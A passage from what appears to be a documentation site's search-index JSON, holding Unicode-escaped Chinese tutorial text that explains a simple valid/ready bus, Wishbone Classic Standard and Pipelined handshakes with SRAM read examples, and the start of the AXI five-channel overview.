0x02\uff08<code>addr_o=0x02</code>\uff09\u200b\u5199\u5165\u200b\u6570\u636e\u200b\uff08<code>we_o=1</code>\uff09\uff0c\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\u4e3a\u200b 0x9a\uff08<code>data_i=0x9a</code>\uff09</li> </ul> <p>\u200b\u89c2\u5bdf\u200b\u4e0a\u9762\u200b\u7684\u200b\u6ce2\u5f62\u200b\uff0c\u200b\u5f97\u5230\u200b\u5982\u4e0b\u200b\u51e0\u6761\u200b\u89c4\u5f8b\u200b\uff1a</p> <ol> <li>master \u200b\u60f3\u8981\u200b\u53d1\u8d77\u200b\u8bf7\u6c42\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u8bbe\u7f6e\u200b <code>valid_o=1</code>\uff1b\u200b\u5f53\u200b slave \u200b\u53ef\u4ee5\u200b\u63a5\u53d7\u200b\u8bf7\u6c42\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u8bbe\u7f6e\u200b <code>ready_i=1</code>\uff1b\u200b\u5728\u200b <code>valid_o=1 &amp;&amp; ready_i=1</code> \u200b\u65f6\u200b\u89c6\u4e3a\u200b\u4e00\u6b21\u200b\u8bf7\u6c42\u200b</li> <li>\u200b\u5982\u679c\u200b master \u200b\u53d1\u8d77\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u540c\u65f6\u200b slave \u200b\u4e0d\u80fd\u200b\u63a5\u6536\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5373\u200b <code>valid_o=1 &amp;&amp; ready_i=0</code>\uff0c\u200b\u6b64\u65f6\u200b master \u200b\u8981\u200b\u4fdd\u6301\u200b <code>addr_o</code> <code>we_o</code> <code>data_o</code> \u200b\u548c\u200b <code>be_o</code> \u200b\u4e0d\u53d8\u200b\uff0c\u200b\u76f4\u5230\u200b\u8bf7\u6c42\u200b\u7ed3\u675f\u200b\uff0c\u200b\u8fd9\u200b\u4e00\u70b9\u200b\u975e\u5e38\u200b\u91cd\u8981\u200b</li> <li>\u200b\u5f53\u200b master \u200b\u4e0d\u200b\u53d1\u8d77\u200b\u8bf7\u6c42\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5373\u200b <code>valid_o=0</code>\uff0c\u200b\u6b64\u65f6\u200b\u603b\u7ebf\u200b\u4e0a\u200b\u7684\u200b\u4fe1\u53f7\u200b\u90fd\u200b\u89c6\u4e3a\u200b\u65e0\u6548\u200b\u6570\u636e\u200b\uff0c\u200b\u4e0d\u200b\u5e94\u8be5\u200b\u8fdb\u884c\u200b\u5904\u7406\u200b\uff1b\u200b\u5bf9\u4e8e\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u53ea\u6709\u200b\u5728\u200b <code>valid_o=1 &amp;&amp; ready_i=1</code> \u200b\u65f6\u200b <code>data_i</code> \u200b\u4e0a\u200b\u7684\u200b\u6570\u636e\u200b\u662f\u200b\u6709\u6548\u200b\u7684\u200b</li> <li>\u200b\u53ef\u4ee5\u200b\u8fde\u7eed\u200b\u591a\u4e2a\u200b\u5468\u671f\u200b\u53d1\u751f\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5373\u200b <code>valid_o=1 &amp;&amp; ready_i=1</code> \u200b\u8fde\u7eed\u200b\u591a\u4e2a\u200b\u5468\u671f\u200b\u7b49\u4e8e\u200b\u4e00\u200b\uff0c\u200b\u6b64\u65f6\u200b\u662f\u200b\u7406\u60f3\u200b\u60c5\u51b5\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8fbe\u5230\u200b\u603b\u7ebf\u200b\u6700\u9ad8\u200b\u7684\u200b\u4f20\u8f93\u901f\u5ea6\u200b</li> </ol> <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u7b80\u6613\u200b\u7684\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u3002</p>"},{"location":"hardware/bus_protocol.html#wishbone","title":"Wishbone","text":"<p>Wishbone \u200b\u662f\u200b\u4e00\u4e2a\u200b\u5728\u200b\u5f00\u6e90\u200b\u793e\u533a\u200b\u5e7f\u6cdb\u200b\u4f7f\u7528\u200b\u7684\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\uff0c\u200b\u5176\u200b\u5206\u4e3a\u200b\u591a\u4e2a\u200b\u7248\u672c\u200b\uff0c\u200b\u4e0b\u9762\u200b\u4ecb\u7ecd\u200b\u5176\u4e2d\u200b\u7684\u200b Wishbone Classic Standard \u200b\u548c\u200b Wishbone Classic Pipelined\u3002</p> <p>Wishbone \u200b\u7684\u200b\u540d\u5b57\u200b\u6765\u6e90\u200b\u5728\u200b\u5b98\u65b9\u200b\u7684\u200b\u6587\u6863\u200b\u91cc\u200b\u6709\u200b\u8bb2\u200b\uff1a</p> <pre><code>Webster\u2019s dictionary defines a WISHBONE as \u201cthe forked clavicle in front of the\nbreastbone of most birds.\u201d The term \u2018WISHBONE interconnect\u2019 was coined by Wade\nPeterson of Silicore Corporation. During the initial definition of the scheme he\nwas attempting to find a name that was descriptive of a bi-directional data bus\nthat used either multiplexers or three-state logic. This was solved by forming\nan interface with separate input and output paths. When these paths are\nconnected to three-state logic it forms a \u2018Y\u2019 shaped configuration that\nresembles a wishbone. The actual name was conceived during a Thanksgiving Day\ndinner that included roast turkey. Thanksgiving Day is a national holiday in the\nUnited States, and is observed on the third Thursday in November. It is\ngenerally celebrated with a traditional turkey dinner.\n</code></pre> <p>\u200b\u7b80\u5355\u200b\u6765\u8bf4\u200b\uff0c\u200b\u5728\u200b\u8d77\u540d\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u60f3\u5230\u200b\u603b\u7ebf\u200b\u7684\u200b\u6837\u5b50\u200b\u50cf\u662f\u200b\u4e00\u4e2a\u200b Y \u200b\u5b57\u578b\u200b\uff0c\u200b\u548c\u200b\u8bb8\u613f\u200b\u9aa8\u200b Wishbone \u200b\u7684\u200b\u5f62\u72b6\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5c31\u200b\u8fd9\u6837\u200b\u8d77\u200b\u4e86\u200b\u540d\u5b57\u200b\u3002</p>"},{"location":"hardware/bus_protocol.html#wishbone-classic-standard","title":"Wishbone Classic Standard","text":"<p>\u200b\u6700\u200b\u7b80\u5355\u200b\u7684\u200b Wishbone \u200b\u7248\u672c\u200b\u53eb\u505a\u200b Wishbone Classic Standard\uff0c\u200b\u5176\u200b\u8bbe\u8ba1\u200b\u601d\u8def\u200b\u548c\u200b\u4e0a\u9762\u200b\u7684\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u975e\u5e38\u200b\u76f8\u4f3c\u200b\uff0c\u200b\u4e0b\u9762\u200b\u5c06\u200b\u4e24\u8005\u200b\u8fdb\u884c\u200b\u4e00\u4e2a\u200b\u5bf9\u6bd4\u200b\u3002Wishbone Classic Standard \u200b\u534f\u8bae\u200b\u7684\u200b master \u200b\u7aef\u200b\uff08CPU \u200b\u7aef\u200b\uff09\u200b\u7684\u200b\u4fe1\u53f7\u200b\uff1a</p> <ol> <li><code>CLK_I</code>: \u200b\u65f6\u949f\u200b\u8f93\u5165\u200b\uff0c\u200b\u5373\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u4e2d\u200b\u7684\u200b <code>clock_i</code></li> <li><code>STB_O</code>\uff1a\u200b\u9ad8\u200b\u8868\u793a\u200b master \u200b\u8981\u200b\u53d1\u9001\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5373\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u4e2d\u200b\u7684\u200b <code>valid_o</code></li> <li><code>ACK_I</code>\uff1a\u200b\u9ad8\u200b\u8868\u793a\u200b slave \u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5373\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u4e2d\u200b\u7684\u200b <code>ready_i</code></li> <li><code>ADR_O</code>\uff1amaster \u200b\u60f3\u8981\u200b\u8bfb\u5199\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u5373\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u4e2d\u200b\u7684\u200b <code>addr_o</code></li> <li><code>WE_O</code>\uff1amaster \u200b\u60f3\u8981\u200b\u8bfb\u200b\u8fd8\u662f\u200b\u5199\u200b\uff0c\u200b\u5373\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u4e2d\u200b\u7684\u200b <code>we_o</code></li> <li><code>DAT_O</code>\uff1amaster \u200b\u60f3\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5373\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u4e2d\u200b\u7684\u200b <code>data_o</code></li> <li><code>SEL_O</code>\uff1amaster \u200b\u8bfb\u5199\u200b\u7684\u200b\u5b57\u8282\u200b\u4f7f\u80fd\u200b\uff0c\u200b\u5373\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u4e2d\u200b\u7684\u200b <code>be_o</code></li> <li><code>DAT_I</code>\uff1amaster \u200b\u4ece\u200b slave \u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5373\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u4e2d\u200b\u7684\u200b <code>data_i</code></li> <li><code>CYC_O</code>\uff1a\u200b\u603b\u7ebf\u200b\u7684\u200b\u4f7f\u200b\u80fd\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u65e0\u200b\u5bf9\u5e94\u200b\u7684\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u4fe1\u53f7\u200b</li> </ol> <p>\u200b\u6b64\u5904\u200b\u5ffd\u7565\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u53ef\u200b\u9009\u200b\u4fe1\u53f7\u200b\u3002\u200b\u9664\u4e86\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b <code>CYC_O</code>\uff0c\u200b\u5176\u4ed6\u200b\u7684\u200b\u4fe1\u53f7\u200b\u5176\u5b9e\u200b\u5c31\u662f\u200b\u4e0a\u6587\u200b\u7684\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u3002<code>CYC_O</code> \u200b\u7684\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u662f\u200b master \u200b\u60f3\u8981\u200b\u5360\u7528\u200b slave \u200b\u7684\u200b\u603b\u7ebf\u200b\u63a5\u53e3\u200b\uff0c\u200b\u5728\u200b\u5e38\u89c1\u200b\u7684\u200b\u4f7f\u7528\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u76f4\u63a5\u200b\u8ba4\u4e3a\u200b <code>CYC_O=STB_O</code>\u3002\u200b\u5b83\u200b\u7684\u200b\u7528\u9014\u200b\u662f\u200b\uff1a</p> <ol> <li>\u200b\u5360\u7528\u200b slave \u200b\u7684\u200b\u603b\u7ebf\u200b\u63a5\u53e3\u200b\uff0c\u200b\u4e0d\u200b\u5141\u8bb8\u200b\u5176\u4ed6\u200b master \u200b\u8bbf\u95ee\u200b</li> <li>\u200b\u7b80\u5316\u200b interconnect \u200b\u7684\u200b\u5b9e\u73b0\u200b</li> </ol> <p>\u200b\u628a\u200b\u4e0a\u9762\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u7684\u200b\u6ce2\u5f62\u56fe\u200b\u6539\u6210\u200b Wishbone Classic Standard\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\uff1a</p> Wishbone Classic Standard \u200b\u7684\u200b\u6ce2\u5f62\u56fe"},{"location":"hardware/bus_protocol.html#wishbone-classic-pipelined","title":"Wishbone Classic Pipelined","text":"<p>Wishbone Classic Standard \u200b\u534f\u8bae\u200b\u975e\u5e38\u7b80\u5355\u200b\uff0c\u200b\u4f46\u662f\u200b\u4f1a\u200b\u9047\u5230\u200b\u4e00\u4e2a\u200b\u95ee\u9898\u200b\uff1a\u200b\u5047\u8bbe\u200b\u5b9e\u73b0\u200b\u7684\u200b\u662f\u200b\u4e00\u4e2a\u200b SRAM \u200b\u63a7\u5236\u5668\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u5468\u671f\u200b\u7ed9\u51fa\u200b\u5730\u5740\u200b\uff0c\u200b\u9700\u8981\u200b\u5728\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u624d\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u7ed3\u679c\u200b\u3002\u200b\u5728\u200b Wishbone Classic Standard \u200b\u4e2d\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u4e0b\u9762\u200b\u7684\u200b\u6ce2\u5f62\u200b\uff1a</p> Wishbone Classic Standard \u200b\u5b9e\u73b0\u200b SRAM \u200b\u63a7\u5236\u5668\u200b\u7684\u200b\u6ce2\u5f62\u56fe\u200b <ul> <li><code>a</code> \u200b\u5468\u671f\u200b\uff1amaster \u200b\u7ed9\u51fa\u200b\u8bfb\u200b\u5730\u5740\u200b 0x01\uff0c\u200b\u6b64\u65f6\u200b SRAM \u200b\u63a7\u5236\u5668\u200b\u5f00\u59cb\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u4f46\u662f\u200b\u6b64\u65f6\u200b\u6570\u636e\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u8bfb\u53d6\u200b\u56de\u6765\u200b\uff0c\u200b\u6240\u4ee5\u200b <code>ACK_I=0</code></li> <li><code>b</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6b64\u65f6\u200b SRAM \u200b\u5b8c\u6210\u200b\u4e86\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u628a\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b 0x12 \u200b\u653e\u5728\u200b <code>DAT_I</code> \u200b\u5e76\u200b\u8bbe\u7f6e\u200b <code>ACK_I=1</code></li> <li><code>c</code> \u200b\u5468\u671f\u200b\uff1amaster \u200b\u7ed9\u51fa\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u8bfb\u200b\u5730\u5740\u200b 0x02\uff0cSRAM \u200b\u8981\u200b\u91cd\u65b0\u200b\u5f00\u59cb\u200b\u8bfb\u53d6\u200b</li> <li><code>d</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6b64\u65f6\u200b SRAM \u200b\u5b8c\u6210\u200b\u4e86\u200b\u7b2c\u4e8c\u6b21\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u628a\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b 0x34 \u200b\u653e\u5728\u200b <code>DAT_I</code> \u200b\u5e76\u200b\u8bbe\u7f6e\u200b <code>ACK_I=1</code></li> </ul> <p>\u200b\u4ece\u200b\u6ce2\u5f62\u200b\u6765\u770b\u200b\uff0c\u200b\u529f\u80fd\u200b\u6ca1\u6709\u200b\u95ee\u9898\u200b\uff0c\u200b\u4f46\u662f\u200b\u6bcf\u200b\u4e24\u4e2a\u200b\u5468\u671f\u200b\u624d\u80fd\u200b\u8fdb\u884c\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u53d1\u6325\u200b\u4e0d\u4e86\u200b\u6700\u9ad8\u200b\u7684\u200b\u6027\u80fd\u200b\u3002\u200b\u5728\u200b <code>a</code> \u200b\u5468\u671f\u200b\u7ed9\u51fa\u200b\u7b2c\u4e00\u4e2a\u200b\u5730\u5740\u200b\uff0c\u200b\u5728\u200b <code>b</code> \u200b\u5468\u671f\u200b\u5f97\u5230\u200b\u7b2c\u4e00\u4e2a\u200b\u6570\u636e\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5982\u679c\u200b\u80fd\u200b\u5728\u200b <code>b</code> \u200b\u5468\u671f\u200b\u7684\u200b\u65f6\u5019\u200b\u7ed9\u51fa\u200b\u7b2c\u4e8c\u4e2a\u200b\u5730\u5740\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5728\u200b <code>c</code> \u200b\u5468\u671f\u200b\u5f97\u5230\u200b\u7b2c\u4e8c\u4e2a\u200b\u6570\u636e\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u6d41\u6c34\u7ebf\u200b\u5f0f\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u8fdb\u884c\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u3002\u200b\u4f46\u662f\u200b\uff0cWishbone Classic Standard \u200b\u8981\u6c42\u200b <code>b</code> \u200b\u5468\u671f\u200b\u65f6\u200b\u7b2c\u4e00\u6b21\u200b\u8bf7\u6c42\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u7ed3\u675f\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u4fee\u6539\u200b\u534f\u8bae\u200b\uff0c\u200b\u6765\u200b\u5b9e\u73b0\u200b\u6d41\u6c34\u7ebf\u200b\u5f0f\u200b\u7684\u200b\u8bf7\u6c42\u200b\u3002</p> <p>\u200b\u5b9e\u73b0\u200b\u601d\u8def\u200b\u4e5f\u200b\u5f88\u200b\u7b80\u5355\u200b\uff1a\u200b\u65e2\u7136\u200b Wishbone Classic Standard \u200b\u8ba4\u4e3a\u200b <code>b</code> \u200b\u5468\u671f\u200b\u65f6\u200b\uff0c\u200b\u7b2c\u4e00\u6b21\u200b\u8bf7\u6c42\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u7ed3\u675f\u200b\uff0c\u200b\u90a3\u200b\u5c31\u8ba9\u200b\u7b2c\u4e00\u6b21\u200b\u8bf7\u6c42\u200b\u63d0\u524d\u200b\u5728\u200b <code>a</code> \u200b\u5468\u671f\u200b\u5b8c\u6210\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u5b83\u200b\u7684\u200b\u6570\u636e\u200b\u8981\u200b\u7b49\u5230\u200b <code>b</code> \u200b\u5468\u671f\u200b\u624d\u80fd\u200b\u7ed9\u51fa\u200b\u3002\u200b\u5b9e\u9645\u4e0a\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u65f6\u5019\u200b\u7684\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u5206\u6210\u200b\u4e86\u200b\u4e24\u200b\u90e8\u5206\u200b\uff1a\u200b\u9996\u5148\u200b\u662f\u200b master \u200b\u5411\u200b slave \u200b\u53d1\u9001\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u8bf7\u6c42\u200b\u5728\u200b <code>a</code> \u200b\u5468\u671f\u200b\u5b8c\u6210\u200b\uff1b\u200b\u7136\u540e\u200b\u662f\u200b slave \u200b\u5411\u200b master \u200b\u53d1\u9001\u200b\u8bfb\u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u7ed3\u679c\u200b\u5728\u200b <code>b</code> \u200b\u5468\u671f\u200b\u5b8c\u6210\u200b\u3002\u200b\u4e3a\u4e86\u200b\u5b9e\u73b0\u200b\u8fd9\u4e2a\u200b\u529f\u80fd\u200b\uff0c\u200b\u8fdb\u884c\u200b\u5982\u4e0b\u200b\u4fee\u6539\u200b\uff1a</p> <ul> <li>\u200b\u6dfb\u52a0\u200b <code>STALL_I</code> \u200b\u4fe1\u53f7\u200b\uff1a<code>CYC_O=1 &amp;&amp; STB_O=1 &amp;&amp; STALL_I=0</code> \u200b\u8868\u793a\u200b\u8fdb\u884c\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u8bf7\u6c42\u200b</li> <li>\u200b\u4fee\u6539\u200b <code>ACK_I</code> \u200b\u4fe1\u53f7\u200b\u542b\u4e49\u200b\uff1a<code>CYC_O=1 &amp;&amp; STB_O=1 &amp;&amp; ACK_I=1</code> \u200b\u8868\u793a\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u54cd\u5e94\u200b</li> </ul> <p>\u200b\u8fdb\u884c\u200b\u5982\u200b\u4e0a\u200b\u4fee\u6539\u200b\uff0c\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b Wishbone Classic Pipelined \u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u3002\u200b\u4e0a\u9762\u200b\u7684\u200b\u4e24\u6b21\u200b\u8fde\u7eed\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u6ce2\u5f62\u200b\u5982\u4e0b\u200b\uff1a</p> Wishbone Classic Pipelined \u200b\u5b9e\u73b0\u200b SRAM \u200b\u63a7\u5236\u5668\u200b\u7684\u200b\u6ce2\u5f62\u56fe\u200b <ul> <li><code>a</code> \u200b\u5468\u671f\u200b\uff1amaster \u200b\u8bf7\u6c42\u200b\u8bfb\u200b\u5730\u5740\u200b 0x01\uff0cslave \u200b\u63a5\u6536\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\uff08<code>STALL_O=0</code>\uff09</li> <li><code>b</code> \u200b\u5468\u671f\u200b\uff1aslave \u200b\u8fd4\u56de\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\u7ed3\u679c\u200b 0x12\uff0c\u200b\u5e76\u200b\u8bbe\u7f6e\u200b <code>ACK_I=1</code>\uff1b\u200b\u540c\u65f6\u200b master \u200b\u8bf7\u6c42\u200b\u8bfb\u200b\u5730\u5740\u200b 0x02\uff0cslave \u200b\u63a5\u6536\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\uff08<code>STALL_O=0</code>\uff09</li> <li><code>c</code> \u200b\u5468\u671f\u200b\uff1aslave \u200b\u8fd4\u56de\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\u7ed3\u679c\u200b 0x34\uff0c\u200b\u5e76\u200b\u8bbe\u7f6e\u200b <code>ACK_I=1</code>\uff1bmaster \u200b\u4e0d\u518d\u200b\u53d1\u8d77\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u8bbe\u7f6e\u200b <code>STB_O=0</code></li> <li><code>d</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6240\u6709\u200b\u8bf7\u6c42\u200b\u5b8c\u6210\u200b\uff0cmaster \u200b\u8bbe\u7f6e\u200b <code>CYC_O=0</code></li> </ul> <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u5229\u7528\u200b Wishbone Classic Pipelined \u200b\u534f\u8bae\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u6bcf\u200b\u5468\u671f\u200b\u8fdb\u884c\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u7684\u200b slave\u3002</p>"},{"location":"hardware/bus_protocol.html#axi","title":"AXI","text":"<p>AXI \u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u662f\u200b ARM \u200b\u516c\u53f8\u200b\u63d0\u51fa\u200b\u7684\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\uff0c\u200b\u5728\u200b ARM \u200b\u5904\u7406\u5668\u200b\u4ee5\u53ca\u200b Xilinx FPGA \u200b\u5185\u200b\u4f7f\u7528\u200b\u7684\u200b\u6bd4\u8f83\u200b\u5e7f\u6cdb\u200b\u3002</p> <p>AXI \u200b\u7684\u200b\u4fe1\u53f7\u200b\u5206\u6210\u200b\u4e94\u4e2a\u200b Channel\uff1a</p> <ol> <li>AW\uff08Address Write\uff09\uff1a\u200b\u5199\u200b\u8bf7\u6c42\u200b\u7684\u200b\u5730\u5740\u200b\u4f1a\u200b\u901a\u8fc7\u200b AW Channel \u200b\u53d1\u9001\u7ed9\u200b Slave</li> <li>W\uff08Write\uff09\uff1a\u200b\u5199\u200b\u8bf7\u6c42\u200b\u7684\u200b\u6570\u636e\u200b\u4f1a\u200b\u901a\u8fc7\u200b W Channel \u200b\u53d1\u9001\u7ed9\u200b Slave</li> <li>B\uff1a\u200b\u5199\u200b\u54cd\u5e94\u200b\u4f1a\u200b\u901a\u8fc7\u200b B Channel \u200b\u53d1\u9001\u7ed9\u200b Master</li> <li>AR\uff08Address Read\uff09\uff1a\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\u7684\u200b\u5730\u5740\u200b\u4f1a\u200b\u901a\u8fc7\u200b AR Channel \u200b\u53d1\u9001\u7ed9\u200b Slave</li> <li>R\uff08Read\uff09\uff1a\u200b\u8bfb\u200b\u54cd\u5e94\u200b\u4f1a\u200b\u901a\u8fc7\u200b R Channel \u200b\u53d1\u9001\u7ed9\u200b Slave</li> </ol> <p>\u200b\u6bcf\u4e2a\u200b Channel \u200b\u90fd\u200b\u5305\u62ec\u200b <code>valid-ready</code> \u200b\u5f0f\u200b\u7684\u200b\u63e1\u624b\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u5bf9\u4e8e\u200b AW\u3001W \u200b\u548c\u200b AR Channel\uff0cMaster \u200b\u662f\u200b\u53d1\u9001\u200b\u65b9\u200b\uff0cSlave \u200b\u662f\u200b\u63a5\u6536\u200b\u65b9\u200b\uff1b\u200b\u5bf9\u4e8e\u200b R \u200b\u548c\u200b B Channel\uff0cSlave \u200b\u662f\u200b\u53d1\u9001\u200b\u65b9\u200b\uff0cMaster \u200b\u662f\u200b\u63a5\u6536\u200b\u65b9\u200b\u3002</p> <p>\u200b\u53ef\u89c1\u200b AXI \u200b\u7684\u200b\u8bbe\u8ba1\u200b\u628a\u200b\u8bf7\u6c42\u200b\u548c\u200b\u54cd\u5e94\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u62c6\u5f00\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5141\u8bb8\u200b\u603b\u7ebf\u200b\u4e0a\u200b\u540c\u65f6\u200b\u6709\u200b\u591a\u4e2a\u200b\u6b63\u5728\u200b\u8fdb\u884c\u200b\u7684\u200b\u8bf7\u6c42\u200b\uff1a\u200b\u4e0d\u7528\u200b\u7b49\u5f85\u200b\u54cd\u5e94\u200b\u56de\u6765\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u53d1\u9001\u200b\u65b0\u200b\u7684\u200b\u8bf7\u6c42\u200b\u3002\u200b\u56e0\u6b64\u200b AXI \u200b\u53ef\u4ee5\u200b\u66f4\u597d\u200b\u5730\u200b\u5229\u7528\u200b\u5185\u5b58\u200b\u7684\u200b\u5e76\u884c\u5ea6\u200b\uff0c\u200b\u8fbe\u5230\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u6027\u80fd\u200b\uff0c\u200b\u4ee3\u4ef7\u200b\u5c31\u662f\u200b\u8bbe\u8ba1\u200b\u66f4\u52a0\u200b\u590d\u6742\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u5b8c\u6210\u200b\u4e00\u6b21\u200b\u5199\u200b\u8bf7\u6c42\u200b\uff0cMaster \u200b\u9700\u8981\u200b\uff1a</p> <ol> <li>\u200b\u901a\u8fc7\u200b AW Channel \u200b\u53d1\u9001\u200b\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u5730\u5740\u200b\u3001\u200b\u5199\u5165\u200b\u7684\u200b\u957f\u5ea6\u200b\u7b49\u200b\u4fe1\u606f\u200b\u7ed9\u200b Slave</li> <li>\u200b\u901a\u8fc7\u200b W Channel \u200b\u53d1\u9001\u200b\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u652f\u6301\u200b Burst\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4f7f\u7528\u200b\u591a\u4e2a\u200b\u5468\u671f\u200b\u5b8c\u6210\u200b\u4e00\u4e2a\u200b\u5199\u200b\u8bf7\u6c42\u200b\u7684\u200b\u6570\u636e\u4f20\u8f93\u200b</li> <li>\u200b\u5728\u200b B Channel \u200b\u4e0a\u200b\u7b49\u5f85\u200b Slave \u200b\u56de\u590d\u200b\u5199\u5165\u200b\u5b8c\u6210\u200b\u7684\u200b\u54cd\u5e94\u200b</li> </ol> <p>\u200b\u4e3a\u4e86\u200b\u5b8c\u6210\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\uff0cMaster \u200b\u9700\u8981\u200b\uff1a</p> <ol> <li>\u200b\u901a\u8fc7\u200b AR Channel \u200b\u53d1\u9001\u200b\u8981\u200b\u8bfb\u53d6\u200b\u7684\u200b\u5730\u5740\u200b\u3001\u200b\u8bfb\u53d6\u200b\u7684\u200b\u957f\u5ea6\u200b\u7b49\u200b\u4fe1\u606f\u200b\u7ed9\u200b Slave</li> <li>\u200b\u5728\u200b R Channel \u200b\u4e0a\u200b\u7b49\u5f85\u200b Slave \u200b\u56de\u590d\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u652f\u6301\u200b 